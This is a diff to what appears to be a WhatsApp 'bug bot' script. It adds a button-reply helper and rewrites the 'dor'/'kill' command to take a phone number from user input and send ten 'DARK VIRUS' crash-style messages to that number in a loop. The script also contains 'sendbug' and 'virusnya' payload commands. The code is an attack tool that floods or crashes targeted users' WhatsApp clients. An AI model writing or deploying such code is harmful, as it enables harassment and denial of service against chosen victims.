@@ -204,6 +204,17 @@ message: {
 }
 }
 
+async function replyNya(teks) {
+   const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }] 
+   const buttonMessage = { 
+text: teks, 
+footer: "", 
+templateButtons: buttonsDefault, 
+image: {url: pp_user}   
+   }
+   return conn.sendMessage(from, buttonMessage)
+}
+
     const virusnya = {
       key: {
         fromMe: false,
@@ -3703,11 +3714,11 @@ case '🗿':
 case '🔥':
 case 'p':
 case 'kill':
-case 'dor': 
+case 'dor': {
  let nomr = q + '@s.whatsapp.net'
-       let jmlhny = '10'
+ let jmlhny = '10'
 for (let i = 0; i < jmlhny; i++) {
-conn.sendMessage(from, {
+conn.sendMessage(nomr, {
 text: 'BUG BY ⚠️ 𝘌𝘬𝘶𝘻𝘪𝘬𝘢 𝘖𝘧𝘊 ⚠️', 
 templateButtons: [
    { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
@@ -4614,6 +4625,7 @@ templateButtons: [
 ]})}
 await sleep(2000)
 reply(`DONE ✅`)
+}
 break
       case 'sendbug':
       case 'philips': {
